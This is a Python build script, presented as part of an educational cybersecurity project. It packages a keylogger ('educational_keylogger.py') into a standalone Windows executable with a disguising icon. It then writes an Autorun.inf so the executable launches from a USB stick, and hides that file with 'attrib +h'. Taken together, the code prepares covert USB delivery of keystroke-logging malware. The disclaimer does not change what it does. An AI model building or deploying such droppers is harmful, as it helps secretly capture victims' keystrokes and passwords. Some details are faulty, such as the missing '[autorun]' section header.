###########################################################################################
#### author: NC
#### date: 08/08/2025
#### Python version: 3.8
####
#### ⚠️ DISCLAIMER:#
#### This file is part of a cybersecurity project.
#### It is intended for educational and research purposes only.
#### Must be executed in a controlled environment (e.g., sandbox or VM).
#### Any misuse of this code is strictly prohibited. The author declines any responsibility.
############################################################################################



import PyInstaller.__main__
import shutil
import os



file = "educational_keylogger.py"
exename = "educational_keylogger.exe"
usb_path = os.getcwd()
usb_file = os.path.join(usb_path, file)
icon = "key.ico"
module_env = r"C:\Users\user\Desktop\python for cyber\github\.venv\Lib\site-packages"



def executable_generation():
    """
    This function create the executable file
    """

    try:
        PyInstaller.__main__.run([
            usb_file,
            "--onefile",
            "--clean",
            "--log-level=ERROR",
            "--name=" + exename,
            "--icon=" + icon,
            "--paths="+ module_env 
            ])
        
        print(f'[*] {exename} was created: {usb_file}')
        shutil.move(os.path.join(usb_path, "dist", exename), usb_path)

        shutil.rmtree("dist")
        shutil.rmtree("build")
        os.remove(exename+".spec")    
        print("[*] Clean-up completed")

    except Exception as e:
        print(e)      



def autorunfile_generation():
    """
    This function create the Autorun.inf file
    """
    try:
        with open("Autorun.inf", "w") as f:
            f.write("Autorun\n")
            f.write("open="+exename+"\n")
            f.write("Action=Start test \n")
            f.write("Label=USB\n")
            f.write("Icon="+exename+"\n")
            os.system(f'attrib +h "{os.path.join(usb_path, "Autorun.inf")}"')

    except Exception as e:
        print(e)



executable_generation()
autorunfile_generation()
print(f"[*] {exename} and 'Autorun.if': {usb_path}")